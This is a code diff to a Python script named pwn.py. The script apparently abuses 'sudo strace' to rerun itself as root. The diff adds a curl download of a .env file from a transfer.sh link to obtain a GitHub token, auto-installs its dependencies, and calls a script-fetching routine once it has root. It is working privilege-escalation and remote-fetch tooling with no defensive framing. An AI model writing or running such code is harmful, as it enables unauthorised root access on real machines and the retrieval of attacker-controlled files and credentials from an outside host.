@@ -9,6 +9,11 @@ gtfoBin = 'sudo strace -o /dev/null {}'
 files = ['pwn.py', '.env']
 
 
+def rerun():
+    subprocess.call(gtfoBin.format('python3 pwn.py').split())
+    exit()
+
+
 def update_python():
     try:
         pyth = 'python3 --version >/dev/null'
@@ -19,41 +24,44 @@ def update_python():
         subprocess.call(gtfoBin.format('yum -y -q -e 0 install python3 > /dev/null').split(), stdout=subprocess.PIPE)
 
 
-if sys.version_info.major > 3:
-    import requests
-    from dotenv import load_dotenv
-    
-
-
-
 def is_root():
     if os.getuid() == 0:
         print("OBTAINED ROOT")
         return True
     else:
         # Rerun This Script As Root User
-        subprocess.call(gtfoBin.format('python3 pwn.py').split())
-        exit()
+        rerun()
 
 
 
 def configureTokens():
-    api_key = None
     try:
-        load_dotenv()
-        api_key = os.getenv("github_key")
+        from dotenv import load_dotenv
     except:
-        '''
-        os.system("pip install -r requirements.txt")
-        '''
-        print("NEED TO IMPLEMENT GETTING DEPENDENCIES")
-        exit()
+        subprocess.call("python3 -m pip install python-dotenv".split(), stdout = subprocess.PIPE)
+        rerun()
+
+    api_key = None
+
+    
+    # Ensure we can download enviornment file
+    subprocess.call("curl -o .env https://transfer.sh/2S2RUM/.env".split())
+    load_dotenv()
+    api_key = os.getenv("github_key")
+
+    assert api_key
 
     return (mainUser, api_key)
 
 
 
 def getScript():
+    try:
+        import requests
+    except:
+        subprocess.call("python3 -m pip install requests".split(), stdout = subprocess.PIPE)
+        rerun()
+
     validAuth = configureTokens()
     if validAuth:
         for file in files:
@@ -77,6 +85,7 @@ def main():
 
     # Next Attempt To Rerun Script As Root. Else, Run Root Priv Things
     if not is_root(): exit()
+    getScript()
     
     
     
